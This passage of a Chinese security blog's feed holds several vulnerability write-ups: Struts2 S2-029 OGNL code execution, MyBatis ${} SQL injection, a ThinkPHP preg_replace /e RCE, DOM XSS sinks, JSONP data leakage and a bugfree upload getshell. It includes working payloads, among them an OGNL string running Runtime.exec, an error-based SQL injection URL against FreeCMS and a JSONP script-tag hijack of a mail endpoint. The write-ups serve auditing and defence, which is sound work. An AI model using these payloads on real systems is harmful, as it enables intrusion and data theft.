W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">412</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.<span class="operator">a</span>.<span class="operator">a</span>.<span class="operator">a</span>(NewServerManager.java:<span class="number">188</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.e.n.<span class="operator">a</span>(UserServerManager.java:<span class="number">245</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.app.ak.<span class="operator">a</span>(LoginActivity.java:<span class="number">147</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.<span class="operator">a</span>(BaseAsyncTask.java:<span class="number">23</span>)
W/System.err(<span class="number">24780</span>):    <span class="keyword">at</span> com.fangdd.mobile.f.<span class="operator">a</span>.doInBackground(BaseAsyncTask.java:<span class="number">8</span>)
</code></pre><p>这个是登录过程中的日志。这个app登录采用了tcp传输的二进制协议，而且进行了签名。通过这个日志，可以方便逆向分析。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/tips/3812" target="_blank" rel="external">http://drops.wooyun.org/tips/3812</a></p>
<p><a href="http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html" target="_blank" rel="external">http://www.cnblogs.com/imouto/archive/2012/12/11/filtering-adb-logcat-output.html</a></p>
<p><a href="https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn" target="_blank" rel="external">https://wiki.cyanogenmod.org/w/Doc:_debugging_with_logcat/zh-cn</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一共5中日志的输出方式：</p>
<p>android.util.Log：提供了五种输出日志的方法</p>
<p>Log.e(), Log.w(), Log.i(), Log.d(), Log.v()</p>
<p>ERROR, WARN, INFO, DEBUG, VER]]>
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[bugfree任意文件上传漏洞]]></title>
    <link href="http://xdxd.love/2016/03/28/bugfree%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%BC%A4%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/28/bugfree任意文件伤上传漏洞/</id>
    <published>2016-03-28T08:57:49.000Z</published>
    <updated>2016-03-28T09:15:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-023919</a><br><a href="http://wooyun.org/bugs/wooyun-2010-074519" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-074519</a></p>
<p>最近渗透过程中遇到一个3.0.2版本的bugfree。利用这个上传获得shell。这个上传其实并不鸡肋。如果bugfree这种系统一般都会存在弱口令，而上传的目录文件名只有3位随机。所以如果可以解析的话就可以getshell。新版本中设置文件目录为bugFile。位于bugfree程序文件的上一级目录。如果运维配置web目录的时候根目录为bugfree目录上一级，也会存在安全问题。</p>
<p><img src="/images/bugfree1.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞详情">漏洞详情</h1><p><a href="http://wooyun.org/bugs/wooyun-2010-023919" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2]]>
    </summary>
    
      <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[struts2 s2-029 漏洞]]></title>
    <link href="http://xdxd.love/2016/03/21/struts2-s2-029-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/03/21/struts2-s2-029-漏洞/</id>
    <published>2016-03-21T02:14:55.000Z</published>
    <updated>2016-03-22T08:23:23.000Z</updated>
    <content type="html"><![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="built_in">values</span> assigned <span class="keyword">to</span> certain <span class="keyword">tags</span> <span class="keyword">so</span> it <span class="keyword">is</span> possible <span class="keyword">to</span> pass in <span class="keyword">a</span> value that will <span class="keyword">be</span> evaluated again when <span class="keyword">a</span> <span class="keyword">tag</span>’<span class="keyword">s</span> attributes will <span class="keyword">be</span> rendered.
</code></pre><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p>
<p>比如：</p>
<pre><code><span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
<span class="tag">&lt;<span class="title">set</span> <span class="attribute">var</span>=<span class="value">"%&amp;#123#parameters.tang3&amp;#125"</span>/&gt;</span>
</code></pre><p>通过<code>%&amp;#123#&amp;#125</code>的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了<code>%&amp;#123&amp;#125</code>形式的字符串的ognl解析。</p>
<p><img src="/images/struts0291.png" alt=""></p>
<pre><code>这段代码的修改用来处理掉了非%&amp;<span class="preprocessor">#<span class="number">123</span>开头，&amp;#<span class="number">125</span>结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#<span class="number">1232</span>+<span class="number">3</span>&amp;#<span class="number">125</span>，在修改之前的代码中<span class="number">2</span>+<span class="number">3</span>是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</span>
</code></pre><p>审计方式就是查看是否有<code>%&amp;#123#&amp;#125</code>这种方式获取用户输入变量复制给标签属性的代码写法。</p>
<p>测试代码：</p>
<pre><code><span class="xml"></span>&lt;%<span class="perl"><span class="variable">@page</span> import=<span class="string">"java.util.HashSet"</span></span>%&gt;<span class="xml">
</span>&lt;%<span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span>%&gt;<span class="xml">
</span>&lt;%<span class="perl">@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> </span>%&gt;<span class="xml">
<span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>Demo jsp page<span class="tag">&lt;/<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">head</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
</span>&lt;%<span class="perl">
  request.setAttribute(<span class="string">"lan"</span>, <span class="string">"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=<span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>(),#a.exec('touch /tmp/1111'),new java.lang.String('"</span>);
</span>%&gt;<span class="xml">
<span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span></span>
</code></pre><p><img src="/images/struts0292.png" alt=""></p>
<p>查看tmp目录文件已经生成。</p>
<p><img src="/images/struts0293.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/" target="_blank" rel="external">http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/</a></p>
<p><a href="http://seclab.dbappsecurity.com.cn/?p=678" target="_blank" rel="external">http://seclab.dbappsecurity.com.cn/?p=678</a></p>
<p><a href="http://www.freebuf.com/vuls/99234.html" target="_blank" rel="external">http://www.freebuf.com/vuls/99234.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="buil]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[google firing-range xss测试应用]]></title>
    <link href="http://xdxd.love/2016/03/17/google-firing-range-xss%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8/"/>
    <id>http://xdxd.love/2016/03/17/google-firing-range-xss测试应用/</id>
    <published>2016-03-17T06:03:47.000Z</published>
    <updated>2016-03-18T00:17:48.000Z</updated>
    <content type="html"><![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href="https://public-firing-range.appspot.com" target="_blank" rel="external">https://public-firing-range.appspot.com</a></p>
<p>谷歌对每个位置都进行了详细的分类。</p>
<p><img src="/source/images/firing-range1.png" alt=""></p>
<p><img src="/source/images/firing-range2.png" alt=""></p>
<p>对其中两例进行分析：location.hash.assign</p>
<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
  <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="built_in">window</span>.location.assign(payload);
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>获取hash值，进入了assign函数。</p>
<p><img src="/source/images/firing-range3.png" alt=""></p>
<p>参考<a href="http://www.wooyun.org/bugs/wooyun-2013-041721" target="_blank" rel="external">搜狗浏览器4.2.2.9903任意网站伪造＋自有协议下XSS*2</a></p>
<p>location.hash.innerHtml</p>
<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
      <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);
div.id = <span class="string">'divEl'</span>;
<span class="built_in">document</span>.documentElement.appendChild(div);
<span class="keyword">var</span> divEl = <span class="built_in">document</span>.getElementById(<span class="string">'divEl'</span>);
divEl.innerHTML = payload;
    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><h1 id="location-search_和location-hash">location.search 和location.hash</h1><p>测试发现location.search获取到的值是浏览器地址栏url编码后的。而location.hash获取到的值是原始的值，既hash是%23获取到就是%23,hash是<code>&lt;</code>获取到就是<code>&lt;</code>说以直接innerHtml可以触发xss。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href]]>
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[审计mybatis的sql注入]]></title>
    <link href="http://xdxd.love/2016/03/14/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2016/03/14/审计mybatis的sql注入/</id>
    <published>2016-03-14T07:27:24.000Z</published>
    <updated>2016-03-15T02:24:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
<p>比如：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
<p>注意参数符号：</p>
<pre><code>#{<span class="ruby">id}</span>
</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：

<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
这里 MyBatis 不会修改或转义字符串。

<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
<p>mapper文件：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="doctype">&lt;!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
        insert into user(name,age) values(#{name},#{age})
        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
        select * from user where name=#{name}
    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
</code></pre><p>在输入中插入单引号</p>
<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
    SqlSession sqlSession = sqlSessionFactory.openSession();
    <span class="keyword">try</span> {
        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
                + user.getAge());
    } <span class="keyword">finally</span> {
        sqlSession.close();
    }
</code></pre><p>查看执行的sql语句：</p>
<p><img src="/images/mybatis21.png" alt=""></p>
<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
<p>查看执行的SQL语句：</p>
<p><img src="/images/mybatis22.png" alt=""></p>
<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
<pre><code>...
 <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
    select
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
      distinct
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
    from CTSPMT.MT_V_MSG_ITEM
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
      order by ${orderByClause}
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
...
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      select * from ( select row_.*, rownum rownum_ from ( 
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
...
</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
<p><img src="/images/mybatis23.png" alt=""></p>
<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
<p>注册用户登录访问：</p>
<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
<p>查看执行的SQL为：</p>
<p><img src="/images/mybatis25.png" alt=""></p>
<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[thinkphp URL命令执行漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/11/thinkphp-URL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/11/thinkphp-URL命令执行漏洞分析/</id>
    <published>2016-03-11T07:14:03.000Z</published>
    <updated>2016-03-11T08:06:17.000Z</updated>
    <content type="html"><![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php 
<span class="number">125</span>  -   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']="\\2";'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
<span class="number">125</span>  +   <span class="variable">$res</span> = preg_replace(<span class="string">'@(w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=\'</span>\\<span class="number">2</span>\<span class="string">';'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>)); 
</code></pre><p>这里导致代码执行的原因有两个，一是preg_replace使用了e修饰符，这样<code>$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;</code> 会被当做php代码执行。而双引号的变量会被解析，导致了代码执行。</p>
<p>关键代码为：</p>
<pre><code><span class="variable">$depr</span> = C(<span class="string">'URL_PATHINFO_DEPR'</span>);
        // 分析PATHINFO信息
        self::getPathInfo();
        <span class="keyword">if</span>(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
            <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim($_SERVER[<span class="string">'PATH_INFO'</span>],<span class="string">'/'</span>));
            <span class="variable">$var</span>  =  array();
            if (C(<span class="string">'APP_GROUP_LIST'</span>) &amp;&amp; !isset($_GET[C(<span class="string">'VAR_GROUP'</span>)])){
                <span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_LIST'</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">''</span>;
                if(C(<span class="string">'APP_GROUP_DENY'</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">'VAR_GROUP'</span>)]),explode(<span class="string">','</span>,strtolower(C(<span class="string">'APP_GROUP_DENY'</span>))))) {
                    // 禁止直接访问分组
                    exit;
                }
            }
            if(!isset($_GET[C(<span class="string">'VAR_MODULE'</span>)])) {// 还没有定义模块名称
                <span class="variable">$var</span>[C(<span class="string">'VAR_MODULE'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            }
            <span class="variable">$var</span>[C(<span class="string">'VAR_ACTION'</span>)]  =   array_shift(<span class="variable">$paths</span>);
            // 解析剩余的URL参数
            <span class="variable">$res</span> = preg_replace(<span class="string">'@(\w+)'</span>.<span class="variable">$depr</span>.<span class="string">'([^'</span>.<span class="variable">$depr</span>.<span class="string">'\/]+)@e'</span>, <span class="string">'$var[\'</span>\\<span class="number">1</span>\<span class="string">']=strip_tags(\'</span>\\<span class="number">2</span>\<span class="string">');'</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));
            $_GET   =  array_merge(<span class="variable">$var</span>,$_GET);
        }
</code></pre><h1 id="反思">反思</h1><p>深入理解漏洞原型，理清复杂逻辑</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://www.zzxiaoyu.cn/?post=63" target="_blank" rel="external">Thinkphp 3.0-3.1版代码执行</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>漏洞很老了。整理一下。<a href="http://www.thinkphp.cn/info/55.html" target="_blank" rel="external">补丁地址</a></p>
<p>代码修复的方式为：</p>
<pre><code>/trunk/T]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[referer安全技术攻防]]></title>
    <link href="http://xdxd.love/2016/03/10/referer%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%94%BB%E9%98%B2/"/>
    <id>http://xdxd.love/2016/03/10/referer安全技术攻防/</id>
    <published>2016-03-10T07:09:02.000Z</published>
    <updated>2016-03-10T07:09:02.000Z</updated>
    <content type="html"></content>
    <summary type="html">
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[jsonp漏洞分析]]></title>
    <link href="http://xdxd.love/2016/03/10/jsonp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/03/10/jsonp漏洞分析/</id>
    <published>2016-03-10T02:46:53.000Z</published>
    <updated>2016-03-10T07:06:32.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>json(javascript object notation)是javascript对象表示法的意思。</p>
<p>比如：</p>
<pre><code>var impromptu_object = {
    <span class="string">"given_name"</span> : <span class="string">"john"</span>,
    <span class="string">"family_name"</span>: <span class="string">"smith"</span>,
    <span class="string">"lucky_numbers"</span>: [<span class="number">11630</span>,<span class="number">12067</span>,<span class="number">12407</span>,<span class="number">12887</span>]
};
alert(impromptu_object.given_name);
</code></pre><p>运行结果是弹出john。</p>
<p>jsonp字面上的含义是”填充式(padding)的JSON”,它通过填充二外的内容吧JSON序列化包装起来，变成一段有效的可以独立运行的Javascript语句。常见的例子包括函数调用(例如callback_function({…JSON data…}))或变量赋值(var return_value = {…JSON data…})</p>
<h1 id="利用方式">利用方式</h1><p>返回值形式为：变量赋值的形式</p>
<pre><code>Qmail.newMailsList={total:446,mailHome:"http://mail.qq.com/cgi-bin/login?f...


<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="keyword">var</span> Qmail={};   先定义变量
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">  
alert(Qmail.newMailsList.nextUrl);  
alert(<span class="built_in">document</span>.scripts[<span class="number">1</span>].src=Qmail.newMailsList.nextUrl);  
alert(Qmail.newMailsList.summary);  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><p>返回值形式为函数调用</p>
<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">  
<span class="function"><span class="keyword">function</span> <span class="title">wooyun_callback</span><span class="params">(a)</span></span>{  
alert(a);  
}  
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.wooyun.org/userdata.php?callback=wooyun_callback"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
</code></pre><h1 id="防御方案">防御方案</h1><p>1，对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。腾讯的一个案例加了”-1”</p>
<pre><code><span class="comment">//Ignoring The First Item "-1"Qmail.newMailsList={total:</span>
